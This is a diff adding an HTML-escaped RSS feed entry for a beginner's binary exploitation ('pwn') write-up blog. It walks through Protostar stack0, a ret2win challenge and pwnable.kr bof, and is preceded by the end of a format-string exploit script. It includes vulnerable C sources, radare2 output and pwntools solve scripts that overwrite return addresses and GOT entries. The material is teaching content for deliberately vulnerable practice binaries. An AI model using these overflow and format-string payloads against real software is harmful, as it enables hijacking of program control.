+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;abs_login_addr = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(abs_login_addr)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;success(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base_address = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+
+authen_code_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;authen_code&amp;#39;&lt;/span&gt;]
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;authen_code offset: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; hex(authen_code_offset))
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fmtstr_payload(&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, {authen_code_offset : &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1ee71ee7&lt;/span&gt;, elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exit&amp;#39;&lt;/span&gt;] : elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;win&amp;#39;&lt;/span&gt;]})
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fmtstr_payload: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;payload&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Enter credentials: &amp;#39;&lt;/span&gt;, payload)
+print(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;clean())
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;footnotes&#34;&gt;Footnotes&lt;/h2&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;Format string bug exploitation tools.&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;</content>
+    </item>
+    
+    <item>
+      <title>PWN Journey: Part 1</title>
+      <link>/posts/pwns-1/</link>
+      <pubDate>Wed, 29 Dec 2021 09:30:00 +1345</pubDate>
+      
+      <guid>/posts/pwns-1/</guid>
+      <description>Foreword Greetings, this series of posts delves into a collection of pwnie solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my writing and attempt to share some knowledge in such a way that could be helpful to others. Not to mention that I am also a rookie in this field, so take my words with a grain of salt and all critics/suggestions are welcome.</description>
+      <content>&lt;h2 id=&#34;foreword&#34;&gt;Foreword&lt;/h2&gt;
+&lt;p&gt;Greetings, this series of posts delves into a collection of &lt;em&gt;pwnie&lt;/em&gt; solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my writing and attempt to share some knowledge in such a way that could be helpful to others. Not to mention that I am also a rookie in this field, so take my words with a grain of salt and all critics/suggestions are welcome.&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;Notwithstanding these step-by-step solutions, I still strongly encourage readers to reproduce or alter the challenges in their own way. Moreover, please do keep in mind that the solutions are not being put in any level orders, even the first ones can be much complicated for you to fully digest. With that said, then scratching your head for hours, diving into the basics and bending them to your needs is a minimum requirement to achieve your goal.&lt;/p&gt;
+&lt;p&gt;Anyway, I hope you have a good time learning.&lt;/p&gt;
+&lt;h2 id=&#34;protostar-stack0-reproduced&#34;&gt;Protostar stack0 (reproduced)&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Goal:&lt;/strong&gt; Change the value of &lt;code&gt;modified&lt;/code&gt; to any but 0.&lt;/p&gt;
+&lt;p&gt;The &lt;em&gt;original challenge&lt;/em&gt; can be found &lt;a href=&#34;https://exploit.education/protostar/stack-zero/&#34;&gt;here&lt;/a&gt;. You should practice this challenge using Protostar VM first since it is built as a 32-bit ELF, much simpler and straightforward.&lt;/p&gt;
+&lt;p&gt;This particular version of stack0, however, is expected to be built and executed on a variety of different architectures, customizations, and such others.&lt;/p&gt;
+&lt;p&gt;Description:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Source code:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// NOTE: I don&amp;#39;t use the VM provided by Protostar. So I will include my build options within the source.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;// Build: $ gcc -g stack0.c -o stack0 -no-pie -fno-stack-protector -z execstack
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv)
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; modified;	&lt;span style=&#34;color:#75715e&#34;&gt;// volatile keyword ensures that this variable is not optimized (deleted) by compilers as it is not being used or modified at all
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;];
+
+  modified &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+  gets(buffer);
+
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(modified &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
+      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;you have changed the &amp;#39;modified&amp;#39; variable&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+  } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Try again?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can achieve the goal by triggering a buffer overflow in the &lt;code&gt;gets&lt;/code&gt; function since it got flagged unsafe, according to MSDN:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-08_11-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;solution&#34;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;Some of you have thought of inserting 64 random characters into the &lt;code&gt;buffer&lt;/code&gt; variable and a random byte to write pass the &lt;code&gt;modified&lt;/code&gt; variable itself then congratulation, you are correct&amp;hellip; theoretically. If you are exercising the challenge connecting to Protostar VM, it should work properly; otherwise, you might encounter as follows:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-08_11-55.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This happened mostly due to our stack alignment or compiler options being somewhat different from that of Protostar VM.&lt;/p&gt;
+&lt;p&gt;Let us have a closer analysis at the assembly code.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_09-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Put your focus around these lines:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x7ffff7fd3050]&amp;gt; s main;pdf
+            ; DATA XREF from entry0 @ 0x55555555507d
+┌ 79: int main (int argc, char **argv, char **envp);
+│           ; var int64_t var_50h @ rbp-0x50
+│           ; var int64_t var_4h @ rbp-0x4
+...
+│           0x555555555154      c745fc000000.  mov dword [var_4h], 0
+│           0x55555555515b      488d45b0       lea rax, [var_50h]
+│           0x55555555515f      4889c7         mov rdi, rax
+│           0x555555555162      b800000000     mov eax, 0
+│           0x555555555167      e8d4feffff     call sym.imp.gets       ; char *gets(char *s)
+│           0x55555555516c      8b45fc         mov eax, dword [var_4h]
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Based on the code, &lt;code&gt;gets&lt;/code&gt; reads a line from STDIN and the size of the buffer can be inferred by subtracting the end address (i.e, &lt;code&gt;rbp-0x50&lt;/code&gt;) with  the start address (i.e, &lt;code&gt;rbp-0x4&lt;/code&gt;). Hence, &lt;code&gt;buf_size = 0x50 - 0x4 = 0x4c = 76 (decimal)&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;solvepy&#34;&gt;Solve.py&lt;/h3&gt;
+&lt;p&gt;And from that we now know how many characters are needed to overflow the buffer, but remember we still have to overwrite the &lt;code&gt;modified&lt;/code&gt; variable.&lt;/p&gt;
+&lt;p&gt;So here is our one-liner.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ python -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;print(b&amp;#34;a&amp;#34;*76 + b&amp;#34;modified_val&amp;#34;)&amp;#39;&lt;/span&gt; | ./stack0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Goal achieved.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_09-30.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;ret2win-reproduce&#34;&gt;ret2win (reproduce)&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Goal:&lt;/strong&gt; Successfully overwrite the return pointer to execute &lt;code&gt;win()&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;A random 32-bit challenge on the Internet with only its source code provided. Same approach but in 64-bit.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Build: $ gcc source.c -o vuln -no-pie -fno-stack-protector -z execstack
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unsafe&lt;/span&gt;() {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;];
+    
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Overflow me&amp;#34;&lt;/span&gt;);
+    gets(buffer);
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+    unsafe();
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;() {
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Exploited!!!!!&amp;#34;&lt;/span&gt;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;code-breakdown&#34;&gt;Code breakdown&lt;/h3&gt;
+&lt;p&gt;The program calls &lt;code&gt;unsafe()&lt;/code&gt;, which contains a buffer overflow vulnerability at the &lt;code&gt;gets&lt;/code&gt; with a buffer of 40 bytes. Furthermore, there is a &lt;code&gt;flag()&lt;/code&gt; function but it is completely isolated, never to be called and we have to somehow invoke the function.&lt;/p&gt;
+&lt;h3 id=&#34;solution-1&#34;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;As already mentioned, we need to find how many bytes to overflow and reach the return address pointer, thus 40 bytes is not enough. You can imagine our skeleton payload should roughly be as follows:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = BUF_SIZE (40 bytes) + SOME_JUNK (?? bytes) + FLAG_ADDR (RIP)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;BUF_SIZE&lt;/code&gt; and &lt;code&gt;SOME_JUNK&lt;/code&gt; in combination, there is a generic term for it called &lt;em&gt;padding&lt;/em&gt; and we have to determine the padding length before you can overwrite the value of &lt;code&gt;RIP&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Let me introduce you to the &lt;strong&gt;De Bruijn Sequence&lt;/strong&gt;, which contains no string of &lt;code&gt;n&lt;/code&gt; character repeated. The sequence can either be created by yourself or any available auxiliaries (e.g., &lt;code&gt;ragg2&lt;/code&gt;, &lt;code&gt;cyclic&lt;/code&gt;, &lt;code&gt;pattern_create (gdb)&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The reason why a &lt;em&gt;random&lt;/em&gt; gibberish string is able to help us to find the padding is that while you are filling the stack with the sequence, &lt;code&gt;RIP&lt;/code&gt; (and even others) could already be overwritten, thereby leading to a SIGSEGV and crashing the execution. With that, the particular position of these so-called &lt;em&gt;random bytes&lt;/em&gt; in &lt;code&gt;RIP&lt;/code&gt; now is that of our padding length in the sequence pattern.&lt;/p&gt;
+&lt;p&gt;Next, we want to load the binary in our debugger and find the padding length.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-40.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;and our registers table:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-50.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;wopO `dr rip` &lt;/code&gt; command simply finds the given value in &lt;code&gt;RIP&lt;/code&gt; into a De Bruijn sequence at a current offset or you can just type &lt;code&gt;wopO 0x41415441&lt;/code&gt; instead and it shows us our padding size, 56.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = PADDING (56 bytes) + FLAG_ADDR (RIP)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have one last factor, the address of &lt;code&gt;flag()&lt;/code&gt; which is &lt;code&gt;0x0040116b&lt;/code&gt;. To get it, simply type &lt;code&gt;afl&lt;/code&gt; for a list of functions and their addresses.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x41415441]&amp;gt; afl
+0x00401050    1 42           entry0
+0x00401090    4 33   -&amp;gt; 31   sym.deregister_tm_clones
+0x004010c0    4 49           sym.register_tm_clones
+0x00401100    3 33   -&amp;gt; 28   sym.__do_global_dtors_aux
+0x00401130    1 2            entry.init0
+0x004011e0    1 1            sym.__libc_csu_fini
+0x00401132    1 40           dbg.unsafe
+0x00401030    1 6            sym.imp.puts
+0x00401040    1 6            sym.imp.gets
+0x004011e4    1 9            sym._fini
+0x00401180    4 93           sym.__libc_csu_init
+0x00401080    1 1            sym._dl_relocate_static_pie
+0x0040115a    1 17           dbg.main
+0x0040116b    1 19           dbg.flag					; THIS ONE
+0x00401000    3 23           map._home_kali_Desktop_Study_PWN_etc_ret2win_vuln.r_x
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using the built-in &lt;code&gt;grep&lt;/code&gt;, radare should have the output optimized&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_12-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;solvepy-1&#34;&gt;Solve.py&lt;/h3&gt;
+&lt;p&gt;Now that we have the padding length, control &lt;code&gt;RIP&lt;/code&gt; and &lt;code&gt;flag()&lt;/code&gt; address.&lt;/p&gt;
+&lt;p&gt;Hence, our final &lt;code&gt;solve.py&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+flag_rip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0040116b&lt;/span&gt;)	&lt;span style=&#34;color:#75715e&#34;&gt;# pack flag_addr: \x6b\x11\x40\x00&lt;/span&gt;
+padding &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; asm(shellcraft&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;nop()) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# 56 bytes of NOP&lt;/span&gt;
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; padding &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag_rip
+
+r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./vuln&amp;#39;&lt;/span&gt;)
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;me&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, payload)
+print(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;clean())
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_13-22.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;pwnablekr---bof&#34;&gt;Pwnable.kr - bof&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Goal:&lt;/strong&gt; Successfully modify the value of &lt;code&gt;key&lt;/code&gt; to spawn a shell.&lt;/p&gt;
+&lt;p&gt;This is an original challenge at &lt;a href=&#34;https://pwnable.kr/play.php&#34;&gt;pwnable.kr&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Description:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Nana told me that buffer overflow is one of the most common software vulnerability. 
+Is that true?
+
+Download : http://pwnable.kr/bin/bof
+Download : http://pwnable.kr/bin/bof.c
+
+Running at : nc pwnable.kr 9000
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Provided source:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;func&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; key){
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; overflowme[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;];
+	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;overflow me : &amp;#34;&lt;/span&gt;);
+	gets(overflowme);	&lt;span style=&#34;color:#75715e&#34;&gt;// smash me!
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(key &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xcafebabe&lt;/span&gt;){
+		system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;);
+	}
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
+		printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Nah..&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+	}
+}
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; argv[]){
+	func(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xdeadbeef&lt;/span&gt;);
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;code-breakdown-1&#34;&gt;Code breakdown&lt;/h3&gt;
+&lt;p&gt;There are only two function, &lt;code&gt;main&lt;/code&gt; and &lt;code&gt;func&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;main&lt;/code&gt; basically calls &lt;code&gt;func&lt;/code&gt; with &lt;code&gt;0xdeadbeef&lt;/code&gt; as its sole &lt;code&gt;key&lt;/code&gt; argument whose value is to be compared with &lt;code&gt;0xcafebabe&lt;/code&gt; and if true, spawns a shell or, otherwise, prints &lt;code&gt;Nah..\n&lt;/code&gt;. Not to mention the obvious buffer overflow as &lt;code&gt;func&lt;/code&gt; creates a 32 bytes buffer then reads it with &lt;code&gt;gets&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;solution-2&#34;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;Since we are not reproducing the challenge but downloading straight from the source, let us check its properties.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_10-14.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Not a fan of radare2? Here is the simplified output from &lt;a href=&#34;https://github.com/slimm609/checksec.sh&#34;&gt;checksec&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_10-16.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As it might be seen, the binary has NX, PIE, and canary bit enabled. Especially with stack canary, we are not able to determine the padding length with De Bruijn Sequence anymore. However, other protection bits are neither important nor able to interrupt our payload in this practice at all so I will skip them for now.&lt;/p&gt;
